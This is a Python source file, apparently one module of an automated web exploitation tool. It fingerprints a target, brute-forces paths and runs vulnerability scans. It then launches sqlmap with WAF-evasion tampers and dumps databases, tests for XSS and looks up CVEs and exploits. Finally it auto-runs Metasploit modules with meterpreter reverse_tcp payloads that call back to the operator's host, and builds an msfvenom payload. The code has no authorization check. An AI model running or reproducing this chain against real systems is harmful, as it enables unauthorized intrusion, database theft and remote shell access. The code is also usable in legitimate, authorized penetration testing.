import json
import re
import shlex
from datetime import datetime
from pathlib import Path

import requests

from common import (
    LOCAL_IP,
    MISSING_TOOLS,
    PORT_SERVICE_MAP,
    detect_local_ip,
    fetch_cve,
    flag_scan,
    print_status,
    run_tool,
    toolname,
)


WEB_PORTS = {80, 443, 8080, 8443}


def _base_url(target, port):
    if port in {443, 8443}:
        return f"https://{target}:{port}"
    return f"http://{target}:{port}"


def _threads_for_mode(attack_mode):
    return {"1": 20, "2": 40, "3": 80}.get(str(attack_mode), 40)


def _parse_ffuf(output):
    results = {}
    for line in output.splitlines():
        m = re.search(r"^\s*/?([^\s]+)\s+\[Status:\s*(\d+)", line)
        if m:
            path = "/" + m.group(1).lstrip("/")
            results[path] = int(m.group(2))
            continue
        m = re.search(r"^\s*(/[^\s]+)\s+\((\d{3})\)", line)
        if m:
            results[m.group(1)] = int(m.group(2))
    return results


def _parse_gobuster(output):
    results = {}
    for line in output.splitlines():
        m = re.search(r"^\s*(/[^\s]+)\s+\(Status:\s*(\d+)\)", line)
        if m:
            results[m.group(1)] = int(m.group(2))
    return results


def _parse_feroxbuster(output):
    results = {}
    for line in output.splitlines():
        m = re.search(r"^\s*(\d{3})\s+\S+\s+\S+\s+\S+\s+(/[^\s]+)", line)
        if m:
            results[m.group(2)] = int(m.group(1))
            continue
        m = re.search(r"^\s*(\d{3})\s+GET\s+(/[^\s]+)", line)
        if m:
            results[m.group(2)] = int(m.group(1))
    return results


def _parse_dirsearch(output):
    results = {}
    for line in output.splitlines():
        m = re.search(r"^\[\d{2}:\d{2}:\d{2}\]\s+(\d{3}).*?\s+(/[^\s]*)", line)
        if m:
            results[m.group(2)] = int(m.group(1))
            continue
        m = re.search(r"^\s*(\d{3})\s+-\s+\d+B\s+-\s+(/[^\s]+)", line)
        if m:
            results[m.group(2)] = int(m.group(1))
    return results


def _parse_dirb(output):
    results = {}
    for line in output.splitlines():
        m = re.search(r"^\+\s+([^\s]+)\s+\(CODE:(\d+)\|", line)
        if m:
            url = m.group(1)
            status = int(m.group(2))
            path = "/" + url.split("/", 3)[-1] if "://" in url else url
            if not path.startswith("/"):
                path = "/" + path
            results[path] = status
    return results


def _parse_headers(head_output):
    interesting = {}
    wanted = {
        "server",
        "x-powered-by",
        "content-type",
        "set-cookie",
        "location",
        "www-authenticate",
    }
    for line in head_output.splitlines():
        if ":" not in line:
            continue
        name, value = line.split(":", 1)
        key = name.strip().lower()
        if key in wanted and value.strip():
            interesting[name.strip()] = value.strip()
    return interesting


def _phase_1_tech_and_waf(base_url):
    tech_stack = []
    waf_detected = False
    waf_name = None
    web_title = ""

    if "whatweb" not in MISSING_TOOLS:
        out = run_tool(f"whatweb {shlex.quote(base_url)} 2>/dev/null", 60)
        flag_scan(out)
        web_title = out
        tokens = re.split(r"[\[\],]", out)
        for token in tokens:
            item = token.strip()
            if item and item not in tech_stack:
                tech_stack.append(item)
                print_status("success", f"Tech detected: {item}")

    if "wafw00f" not in MISSING_TOOLS:
        out = run_tool(f"wafw00f {shlex.quote(base_url)} 2>/dev/null", 60)
        flag_scan(out)
        if "is behind" in out:
            waf_detected = True
            m = re.search(r"is behind (.+)", out)
            waf_name = m.group(1).strip(". \n") if m else "Unknown WAF"
            print_status("warning", f"WAF detected: {waf_name}")
        else:
            print_status("negative", "No WAF detected")

    out = run_tool(f"curl -s -I {shlex.quote(base_url)}", 60)
    flag_scan(out)
    headers = _parse_headers(out)
    for name, value in headers.items():
        print_status("success", f"Header: {name}: {value}")

    return tech_stack, waf_detected, waf_name, headers, web_title


def _phase_2_discovery(base_url, attack_mode):
    threads = _threads_for_mode(attack_mode)
    found_paths = {}
    active_tools = 0

    if "ffuf" not in MISSING_TOOLS:
        active_tools += 1
        out = run_tool(
            f"ffuf -u {shlex.quote(base_url + '/FUZZ')} "
            "-w /usr/share/wordlists/dirb/common.txt "
            "-mc 200,204,301,302,307,401,403 "
            f"-t {threads} -s 2>/dev/null",
            180,
        )
        flag_scan(out)
        found_paths.update(_parse_ffuf(out))

    if "gobuster" not in MISSING_TOOLS:
        active_tools += 1
        out = run_tool(
            f"gobuster dir -u {shlex.quote(base_url)} "
            "-w /usr/share/wordlists/dirb/common.txt "
            f"-t {threads} -q --no-error 2>/dev/null",
            180,
        )
        flag_scan(out)
        found_paths.update(_parse_gobuster(out))

    if "feroxbuster" not in MISSING_TOOLS:
        active_tools += 1
        out = run_tool(
            f"feroxbuster -u {shlex.quote(base_url)} "
            "-w /usr/share/wordlists/dirb/common.txt "
            "--silent --no-state 2>/dev/null",
            180,
        )
        flag_scan(out)
        found_paths.update(_parse_feroxbuster(out))

    if "dirsearch" not in MISSING_TOOLS:
        active_tools += 1
        out = run_tool(f"dirsearch -u {shlex.quote(base_url)} -q 2>/dev/null", 180)
        flag_scan(out)
        found_paths.update(_parse_dirsearch(out))

    if active_tools == 0 and "dirb" not in MISSING_TOOLS:
        out = run_tool(
            f"dirb {shlex.quote(base_url)} /usr/share/wordlists/dirb/common.txt -S",
            180,
        )
        flag_scan(out)
        found_paths.update(_parse_dirb(out))

    for path, code in sorted(found_paths.items(), key=lambda item: item[1]):
        print_status("success", f"Found: {path} (Status: {code})")
        flag_scan(path)

    return found_paths


def _phase_3_vuln_scan(base_url, port):
    vuln_findings = []

    if "nikto" not in MISSING_TOOLS:
        nikto_path = f"/tmp/nikto_{port}.txt"
        run_tool(f"nikto -h {shlex.quote(base_url)} -output {shlex.quote(nikto_path)} -Format txt", 120)
        nikto_text = ""
        p = Path(nikto_path)
        if p.exists():
            nikto_text = p.read_text(encoding="utf-8", errors="replace")
        flag_scan(nikto_text)
        keys = (
            "vulnerability",
            "osvdb",
            "injection",
            "xss",
            "traversal",
            "disclosure",
            "default password",
            "outdated",
            "dangerous",
            "sql",
        )
        for line in nikto_text.splitlines():
            lowered = line.lower()
            if any(k in lowered for k in keys):
                vuln_findings.append({"source": "nikto", "detail": line.strip()})
                print_status("warning", f"Nikto: {line.strip()}")

    if "nuclei" not in MISSING_TOOLS:
        out = run_tool(
            f"nuclei -u {shlex.quote(base_url)} -s medium,high,critical -silent 2>/dev/null",
            120,
        )
        flag_scan(out)
        for line in out.splitlines():
            m = re.search(r"\[(info|low|medium|high|critical)\]\s+\[([^\]]+)\]\s+(\S+)", line, re.I)
            if m:
                sev = m.group(1).lower()
                template = m.group(2).strip()
                matched_url = m.group(3).strip()
                finding = {
                    "source": "nuclei",
                    "severity": sev,
                    "template": template,
                    "url": matched_url,
                }
                vuln_findings.append(finding)
                print_status("warning", f"Nuclei [{sev}]: {template} -> {matched_url}")

    return vuln_findings


def _should_run_injection(found_paths, web_title):
    if any(p.lower().endswith((".php", ".asp", ".aspx")) for p in found_paths):
        return True
    if any(k in p.lower() for p in found_paths for k in ("login", "admin", "search", "user", "query")):
        return True
    if any("?" in p for p in found_paths):
        return True
    if "login" in web_title.lower() or "form" in web_title.lower():
        return True
    return False


def _pick_target_url(base_url, found_paths):
    ranked = sorted(found_paths.items(), key=lambda item: (item[1] != 200, item[0]))
    if ranked:
        return base_url.rstrip("/") + ranked[0][0]
    return base_url


def _phase_4_injection(base_url, found_paths, waf_detected, web_title):
    vuln_findings = []
    sqli_findings = []

    if not _should_run_injection(found_paths, web_title):
        return vuln_findings, sqli_findings

    if "sqlmap" not in MISSING_TOOLS:
        target_url = _pick_target_url(base_url, found_paths)
        tamper = " --tamper=space2comment,between" if waf_detected else ""
        out = run_tool(
            f"sqlmap -u {shlex.quote(target_url)} --forms --batch --level=2 --risk=2"
            f"{tamper} --dbs --output-dir=/tmp/sqlmap_out -q",
            120,
        )
        flag_scan(out)
        if "is vulnerable" in out.lower():
            param = "unknown"
            db_type = "unknown"
            db_names = []
            m_param = re.search(r"Parameter:\s*([^\s]+)", out, re.I)
            if m_param:
                param = m_param.group(1)
            m_db = re.search(r"back-end DBMS:\s*([^\n]+)", out, re.I)
            if m_db:
                db_type = m_db.group(1).strip()
            for line in out.splitlines():
                if "available databases" in line.lower() or line.strip().startswith("[*] "):
                    db_names.append(line.strip())

            run_tool(
                f"sqlmap -u {shlex.quote(target_url)} --forms --batch --dump --output-dir=/tmp/sqlmap_out -q",
                120,
            )
            finding = {"parameter": param, "db_type": db_type, "db_names": db_names}
            sqli_findings.append(finding)
            print_status("success", f"SQLi confirmed: {param} | DB: {db_type}")
            print_status("success", "Dumped data saved to /tmp/sqlmap_out/")
        else:
            print_status("negative", "No SQLi detected")

    if "dalfox" not in MISSING_TOOLS:
        for path, code in found_paths.items():
            if code != 200:
                continue
            url = base_url.rstrip("/") + path
            out = run_tool(f"dalfox url {shlex.quote(url)} --silence 2>/dev/null", 60)
            flag_scan(out)
            if "POC" in out or "FOUND" in out:
                payload = ""
                param = "unknown"
                m_poc = re.search(r"(POC[^\n]*)", out)
                if m_poc:
                    payload = m_poc.group(1).strip()
                m_param = re.search(r"param(?:eter)?\s*[:=]\s*([^\s]+)", out, re.I)
                if m_param:
                    param = m_param.group(1)
                vuln_findings.append(
                    {"source": "dalfox", "type": "xss", "parameter": param, "path": path, "payload": payload}
                )
                print_status("success", f"XSS found: {param} at {path}")

    needs_wfuzz = any("?" in p for p in found_paths) or any(p.lower().endswith(".php") for p in found_paths)
    if needs_wfuzz and "wfuzz" not in MISSING_TOOLS:
        out = run_tool(
            f"wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {shlex.quote(base_url + '/FUZZ')} 2>/dev/null",
            60,
        )
        flag_scan(out)
        for line in out.splitlines():
            m = re.search(r"\b(\d{3})\b.*\s(\/[^\s]+)$", line)
            if m and m.group(1) != "404":
                print_status("success", f"Fuzz result: {m.group(2)} (Status: {m.group(1)})")

    return vuln_findings, sqli_findings


def _phase_5_cve_and_exploits(port_service_map):
    cve_map = {}
    exploit_suggestions = []

    for port, svc_info in port_service_map.items():
        service = None
        version = None
        if isinstance(svc_info, dict):
            service = svc_info.get("service")
            version = svc_info.get("version")
        elif isinstance(svc_info, str):
            service = svc_info

        if not service or not version:
            continue

        found_any = False
        cves = []
        try:
            query = f"{service} {version}".strip()
            resp = requests.get(
                "https://services.nvd.nist.gov/rest/json/cves/2.0",
                params={"keywordSearch": query, "cvssV3Severity": "HIGH"},
                timeout=15,
            )
            resp.raise_for_status()
            data = resp.json()
            for item in data.get("vulnerabilities", []):
                cve = item.get("cve", {})
                cve_id = cve.get("id")
                score = None
                metrics = cve.get("metrics", {})
                if metrics.get("cvssMetricV31"):
                    score = metrics["cvssMetricV31"][0]["cvssData"].get("baseScore")
                if score is None and metrics.get("cvssMetricV30"):
                    score = metrics["cvssMetricV30"][0]["cvssData"].get("baseScore")
                if score is None:
                    continue
                if float(score) < 6.0:
                    continue
                desc = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        desc = d.get("value", "")
                        break
                record = {"id": cve_id, "score": score, "description": desc}
                cves.append(record)
                short_desc = (desc[:100] + "...") if len(desc) > 100 else desc
                print_status("success", f"CVE: {cve_id} | CVSS: {score} | {short_desc}")
                found_any = True
        except Exception:
            pass

        if cves:
            cve_map[port] = cves
        else:
            # Keep shared behavior active even when phase-specific query has no results.
            fetch_cve(service, version)

        if "searchsploit" not in MISSING_TOOLS:
            out = run_tool(f"searchsploit {shlex.quote(service + ' ' + version)} --json 2>/dev/null", 60)
            flag_scan(out)
            try:
                payload = json.loads(out) if out else {}
            except json.JSONDecodeError:
                payload = {}
            for item in payload.get("RESULTS_EXPLOIT", []):
                title = item.get("Title", "").strip()
                path = item.get("Path", "").strip()
                if title and path:
                    exploit_suggestions.append({"title": title, "path": path, "service": service, "version": version})
                    print_status("success", f"Exploit: {title} -> {path}")
                    found_any = True

        if not found_any:
            print_status("negative", f"No CVEs or exploits found for {service} {version}")

    return cve_map, exploit_suggestions


def _is_high_or_critical(vuln_findings):
    for item in vuln_findings:
        sev = str(item.get("severity", "")).lower()
        if sev in {"high", "critical"}:
            return True
    return False


def _extract_first_module(msf_search_output):
    for line in msf_search_output.splitlines():
        if re.match(r"^\s*\d+\s+", line):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def _phase_6_metasploit(target, cve_map, vuln_findings, os_guess):
    if not cve_map and not _is_high_or_critical(vuln_findings):
        return {"shell_access": False, "shell_type": None, "msf_modules": {}}

    msf_modules = {}
    shell_access = False
    shell_type = None
    chosen_local_ip = LOCAL_IP or detect_local_ip()

    if "msfconsole" in MISSING_TOOLS:
        return {"shell_access": False, "shell_type": None, "msf_modules": msf_modules}

    for port, cves in cve_map.items():
        for cve in cves:
            cve_id = cve.get("id")
            if not cve_id:
                continue
            out = run_tool(f'msfconsole -q -x "search {cve_id}; exit" 2>/dev/null', 180)
            flag_scan(out)
            module_path = _extract_first_module(out)
            if module_path:
                msf_modules[cve_id] = {"module": module_path, "port": port}
                print_status("success", f"Metasploit module found: {module_path}")

    if msf_modules:
        payload = "windows/x64/meterpreter/reverse_tcp" if "windows" in str(os_guess).lower() else "linux/x86/meterpreter/reverse_tcp"
        for cve_id, item in msf_modules.items():
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            rc_path = f"/tmp/{toolname}_msf_{ts}.rc"
            rc_content = (
                f"use {item['module']}\n"
                f"set RHOSTS {target}\n"
                f"set RPORT {item['port']}\n"
                f"set LHOST {chosen_local_ip}\n"
                "set LPORT 4444\n"
                f"set PAYLOAD {payload}\n"
                "set ExitOnSession false\n"
                "exploit -j\n"
                "sleep 10\n"
                "sessions -l\n"
            )
            Path(rc_path).write_text(rc_content, encoding="utf-8")
            out = run_tool(f"msfconsole -q -r {shlex.quote(rc_path)}", 180)
            flag_scan(out)
            if "Meterpreter session" in out:
                print_status("success", "METERPRETER SESSION OPENED")
                shell_access = True
                shell_type = "meterpreter"
                break
            if "Command shell session" in out:
                print_status("success", "COMMAND SHELL SESSION OPENED")
                shell_access = True
                shell_type = "shell"
                break

    if not shell_access and "msfvenom" not in MISSING_TOOLS:
        payload = "windows/x64/meterpreter/reverse_tcp" if "windows" in str(os_guess).lower() else "linux/x86/meterpreter/reverse_tcp"
        out = run_tool(
            f"msfvenom -p {payload} LHOST={chosen_local_ip} LPORT=4444 -f elf -o /tmp/{toolname}_payload.elf 2>/dev/null",
            180,
        )
        flag_scan(out)
        print_status("info", f"Payload saved: /tmp/{toolname}_payload.elf")
        print_status(
            "info",
            "Start listener manually: msfconsole -q -x \"use exploit/multi/handler; "
            f"set PAYLOAD {payload}; set LHOST {chosen_local_ip}; set LPORT 4444; run\"",
        )

    return {"shell_access": shell_access, "shell_type": shell_type, "msf_modules": msf_modules}


def run_web_module(target, open_ports, port_service_map=None, attack_mode="2", os_guess=""):
    print_status("info", "Starting Web Exploitation module")
    findings = {
        "tech_stack": [],
        "waf_detected": False,
        "waf_name": None,
        "headers": {},
        "found_paths": {},
        "vuln_findings": [],
        "sqli_findings": [],
        "cve_map": {},
        "exploit_suggestions": [],
        "shell_access": False,
        "shell_type": None,
        "msf_modules": {},
    }

    service_map = port_service_map if port_service_map is not None else PORT_SERVICE_MAP
    web_ports = [p for p in open_ports if int(p) in WEB_PORTS]
    if not web_ports:
        print_status("negative", "No web ports detected for Web module")
        return findings

    for port in web_ports:
        port = int(port)
        base_url = _base_url(target, port)
        print_status("info", f"Scanning web target: {base_url}")

        tech_stack, waf_detected, waf_name, headers, web_title = _phase_1_tech_and_waf(base_url)
        findings["tech_stack"].extend(tech_stack)
        findings["waf_detected"] = findings["waf_detected"] or waf_detected
        findings["waf_name"] = findings["waf_name"] or waf_name
        findings["headers"].update(headers)

        found_paths = _phase_2_discovery(base_url, attack_mode)
        findings["found_paths"].update(found_paths)

        vuln_phase3 = _phase_3_vuln_scan(base_url, port)
        findings["vuln_findings"].extend(vuln_phase3)

        vuln_phase4, sqli_findings = _phase_4_injection(base_url, found_paths, waf_detected, web_title)
        findings["vuln_findings"].extend(vuln_phase4)
        findings["sqli_findings"].extend(sqli_findings)

    cve_map, exploits = _phase_5_cve_and_exploits(service_map)
    findings["cve_map"] = cve_map
    findings["exploit_suggestions"] = exploits

    msf_result = _phase_6_metasploit(target, cve_map, findings["vuln_findings"], os_guess)
    findings.update(msf_result)

    return findings
